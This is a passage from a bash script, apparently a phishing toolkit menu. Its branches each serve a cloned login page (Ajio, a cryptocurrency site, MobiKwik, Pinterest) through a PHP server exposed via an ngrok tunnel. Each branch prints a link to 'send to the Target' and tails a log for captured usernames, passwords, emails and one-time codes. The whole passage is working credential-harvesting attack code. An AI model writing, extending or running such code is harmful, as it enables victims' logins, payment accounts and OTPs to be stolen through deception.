                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "Username" -e "password" -e "otp"       
                ;;

                29)cd sites/
                  cd ajio/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "username" -e "password"    

                ;;

                30)cd sites/
                  cd cryptocurrency/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "email" -e "password"     

                ;;
   
               
                  31)cd sites/
                  cd mobikwik/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "userId" -e "otp"     

                ;;

                32)cd sites/
                  cd pinterest/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "id" -e "password"      

                ;;
   
               


                99)echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m                                                         >> THANKS FOR JOIN US >> \e[0m'
                   sleep 1
                   exit
                ;;


                esac
                ;;
